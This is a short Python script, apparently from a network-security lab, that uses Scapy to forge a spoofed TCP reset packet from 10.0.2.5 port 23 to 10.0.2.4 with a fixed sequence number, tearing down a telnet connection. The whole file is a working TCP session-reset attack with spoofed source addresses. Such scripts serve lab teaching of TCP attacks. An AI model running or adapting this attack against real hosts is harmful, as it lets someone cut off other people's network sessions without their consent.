#!/user/bin/python3
import sys
from scapy.all import*

print("Sending reser packet....")
IPLayer = IP(src = "10.0.2.5", dst = "10.0.2.4")
TCPLayer = TCP(sport=23, dport=51752, flags="R", seq=1872742844)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)
